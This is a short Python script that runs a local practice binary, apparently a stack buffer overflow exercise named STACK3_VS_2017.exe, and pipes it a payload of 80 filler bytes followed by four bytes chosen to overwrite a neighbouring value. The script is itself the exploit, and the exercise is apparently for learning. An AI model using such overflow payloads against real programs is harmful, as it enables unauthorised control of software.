import sys
from subprocess import Popen, PIPE

payload = b"A" *80 + b"\x05\x00\x02\x01"

io = Popen(r"C:\code\exploit\part1-stackabos\STACKS\STACK3_VS_2017.exe", stdin=PIPE)

print("Enter the payload")
io.communicate(payload)
io.wait()
input()

